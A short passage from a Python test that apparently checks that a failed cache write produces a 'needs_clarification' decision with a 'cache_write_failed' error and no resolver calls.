        resolver=resolver,
        cache_dir=tmp_path / "cache",
    )

    assert calls == 0
    assert decision.outcome == "needs_clarification"
    assert meta["error"] == "cache_write_failed"
